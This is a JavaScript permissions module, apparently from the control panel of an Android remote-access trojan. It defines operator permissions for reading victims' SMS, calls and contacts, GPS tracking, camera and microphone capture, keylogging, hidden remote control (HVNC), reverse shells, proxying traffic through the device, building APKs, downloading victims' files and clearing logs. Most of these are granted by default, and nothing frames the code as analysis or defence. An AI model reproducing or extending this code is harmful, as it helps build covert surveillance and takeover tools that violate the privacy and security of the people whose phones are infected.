export const ALL_PERMISSIONS = [
    'dashboard:view', 'device:view', 'device:sms', 'device:calls',
    'device:contacts', 'device:gps', 'device:camera', 'device:mic',
    'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
    'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:proxy', 'device:shell', 'device:command',
    'device:delete',
    'builder:access', 'logs:view', 'logs:clear', 'users:manage',
    'settings:view', 'settings:edit', 'stats:view', 'files:download',
];
export const DEFAULT_USER_PERMISSIONS = [
    'dashboard:view', 'device:view', 'device:sms', 'device:calls',
    'device:contacts', 'device:gps', 'device:camera', 'device:mic',
    'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
    'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:proxy', 'device:shell', 'device:command',
    'logs:view', 'settings:view',
];
export const PERMISSION_GROUPS = [
    {
        label: 'Device Features',
        permissions: [
            { key: 'dashboard:view', label: 'View Dashboard', description: 'Access the main dashboard' },
            { key: 'device:view', label: 'View Devices', description: 'View device list and basic info' },
            { key: 'device:sms', label: 'SMS', description: 'Access SMS messages' },
            { key: 'device:calls', label: 'Calls', description: 'Access call logs' },
            { key: 'device:contacts', label: 'Contacts', description: 'Access contacts list' },
            { key: 'device:gps', label: 'GPS Tracking', description: 'GPS location tracking' },
            { key: 'device:camera', label: 'Camera', description: 'Camera capture' },
            { key: 'device:mic', label: 'Microphone', description: 'Microphone recording' },
            { key: 'device:files', label: 'Files', description: 'File browser access' },
            { key: 'device:wifi', label: 'WiFi', description: 'WiFi network data' },
            { key: 'device:clipboard', label: 'Clipboard', description: 'Clipboard data' },
            { key: 'device:notifications', label: 'Notifications', description: 'Device notifications' },
            { key: 'device:permissions', label: 'App Permissions', description: 'View app permissions' },
            { key: 'device:apps', label: 'Installed Apps', description: 'View installed applications' },
            { key: 'device:fason', label: '亚太科技管理', description: '亚太科技应用管理' },
            { key: 'device:screen', label: 'Live Screen', description: 'Live screen streaming and remote control' },
            { key: 'device:hvnc', label: 'HVNC', description: 'Hidden virtual display control' },
            { key: 'device:keylogger', label: 'Keylogger', description: 'View captured keystroke data' },
            { key: 'device:proxy', label: 'SOCKS5 Proxy', description: 'Network proxy tunneling through device' },
            { key: 'device:shell', label: 'Reverse Shell', description: 'Remote shell command execution' },
            { key: 'device:command', label: 'Send Commands', description: 'Send commands to devices' },
            { key: 'device:delete', label: 'Delete Devices', description: 'Remove devices and their data' },
        ],
    },
    {
        label: 'System',
        permissions: [
            { key: 'builder:access', label: 'APK Builder', description: 'Build and download APK files' },
            { key: 'logs:view', label: 'View Logs', description: 'View system logs' },
            { key: 'logs:clear', label: 'Clear Logs', description: 'Delete all system logs' },
            { key: 'users:manage', label: 'Manage Users', description: 'Create, edit, delete users and permissions' },
            { key: 'settings:view', label: 'View Settings', description: 'View system configuration' },
            { key: 'settings:edit', label: 'Edit Settings', description: 'Modify system configuration' },
            { key: 'stats:view', label: 'View Statistics', description: 'Access system statistics' },
            { key: 'files:download', label: 'Download Files', description: 'Download photos, recordings, and files from devices' },
        ],
    },
];
/** Admin gets all permissions; user gets their assigned list. Fail-closed: returns empty on error. */
export function resolvePermissions(role, permissionsJson) {
    if (role === 'admin')
        return [...ALL_PERMISSIONS];
    try {
        const parsed = JSON.parse(permissionsJson);
        if (!Array.isArray(parsed))
            return [];
        return parsed.filter((p) => ALL_PERMISSIONS.includes(p));
    }
    catch {
        return [];
    }
}
export { CMD, SCREEN_ACTION, REALTIME_COMMANDS } from '../constants/index.js';
//# sourceMappingURL=index.js.map